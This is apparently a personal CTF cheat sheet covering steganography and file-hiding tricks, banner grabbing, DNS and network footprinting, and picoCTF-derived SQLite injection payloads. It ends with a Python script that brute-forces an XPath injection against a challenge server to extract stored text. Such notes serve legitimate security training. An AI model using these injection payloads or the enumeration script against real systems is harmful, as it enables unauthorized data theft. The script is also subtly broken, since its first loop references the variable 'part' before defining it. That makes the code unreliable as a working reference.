# CTF Tips & Tricks

* Flask session cookie decode: https://gist.github.com/babldev/502364a3f7c9bafaa6db
    * https://ctftime.org/writeup/11812
* MD5 Collision Generator: https://github.com/corkami/collisions
* MD5 Algorithm without padding or length: https://gist.github.com/natmchugh/fbea8efeced195a2acf2
* MD5 Collision Demo (With files): https://www.mscs.dal.ca/~selinger/md5collision/
* `echo "93bdab204067321ff131f560879db46bee3b994bf24836bb78538640f689e58f *ubuntu-20.04.2.0-desktop-amd64.iso" | shasum -a 256 --check`
* https://www.spammimic.com/decode.cgi
* https://extract.me/ (Can use to unhide sheets in excel, or just simply click unhide in excel itself)
* Can use 7z to see content of hidden protected sheets in excel file. In sharedStrings.xml. Cannot simply unhide from excel.
* MIME email file may contain more info in quote printable encoding. See raw text.
* Can use https://www.ilovepdf.com/ to extract all images from a pdf. May have hidden images in pdf.
* 7zip is very useful
* Can combine zip files with jpg/png/gif files: `copy /B pic.jpg+file.zip newfile.jpg`
    * https://www.howtogeek.com/119365/how-to-hide-zip-files-inside-a-picture-without-any-extra-software/
* NMAP Cheatsheet: https://s3-us-west-2.amazonaws.com/stationx-public-download/nmap_cheet_sheet_0.6.pdf
* Banner Grabbing
    * Can use telnet, nc, curl, nmap
    * Telnet web server:
        * `telnet <ip> 80`
        * `GET / HTTP/1.1`
    * nc Web server:
        * Connect then call `HEAD / HTTP/1.0` or `HEAD / HTTP/1.1`
    * SSH Server:
        * `nc <ip> 22`
    * TCP "Banner Grab":
        * Not really banner grabbing but can be used to find open TCP services.
        * `echo "" | nc -v -n -w1 <target IP> <port range>`
    * Curl banner grabbing:
        * `curl -l <ip>`
    * Nmap banner grabbing:
        * `nmap -sV --script=banner <target>`

Footprinting Techniques:
* Registrar Query
    * `whois <ip>`
    * https://www.easywhois.com
* DNS Query
    * BIND install: https://linuxtechlab.com/configuring-dns-server-using-bind/
    * dnsdumpster.com
    * `dig`: Domain information groper (DiG)
        * `dig axfr`: zone transfer may reveal more records. Dont know how it works...
    * `nslookup`: Query DNS for IP address of a give host
        * `nslookup <HOST> <DNS_SERVER>`
    * `host`
    * https://toolbox.googleapps.com/apps/dig/#ANY/
    * https://tools.dnsstuff.com
* Network Query
    * `traceroute <ip>`
    * https://tools.keycdn.com/traceroute
* Web Crawling
* Email Tracing
    * https://www.ip2location.com/free/email-tracer
    * https://www.wikihow.com/Trace-an-Email
* Web Scraping
    * Tools: 
        * https://www.httrack.com/page/2/en/index.html : Use to recreate the directory of a website.
        * Scrapy
* Directory Search
    * Tools:
        * Dirbuster

Whatweb

* Hash Cracking: https://crackstation.net/

sql injection
* sqlite
    * `a'||'dmin' except select * from users where username='`
        * https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Web_Gauntlet_2.md
    * `' glob '*`
        * https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Web_Gauntlet_2.md
    * `a' IS NOT 'b`
        * https://github.com/ZeroDayTea/PicoCTF-2021-Killer-Queen-Writeups/blob/main/WebExploitation/WebGauntlet2.md


xpath injection
* https://ctftime.org/writeup/27161
```python
import requests
from string import ascii_letters, digits

nodes = []  # contains the incomplete node names
complete = []  # contains complete node names
url = "http://mercury.picoctf.net:16521/"
chars = ascii_letters + digits + "{}_"  # possible characters that will be enumerated over
keyphrase = "on the right path."  # string that indicates a positive hit

def generate_payload(txt):
    return {"name": f"' or //*[starts-with(text(),'{txt}')] or '1'='", "pass": ""}
#     return {"name":"asdf", "pass":f"' or //*[starts-with(text(),'{txt}')] or '1'='"}
#     return {"name": f"' or //*[contains(.,'{txt}')] or 'x'='", "pass": ""}

# Populate nodes with first characters
for c in chars:
    x = requests.post(url, data=generate_payload(part + c))
    if keyphrase in x.text:
        nodes.append(c)

# Enumerate nodes until nothing is left
# while nodes:
for i in range(2):
    nodes_copy = nodes.copy()
    for part in nodes_copy:
        print(f"Injecting {part}...")
        done = True
        for c in chars:
            x = requests.post(url, data=generate_payload(part + c))
            if keyphrase in x.text:
                nodes.append(part + c)
                done = False
        if done:
            complete.append(part)
        nodes.remove(part)
    print(nodes)
print(complete)
```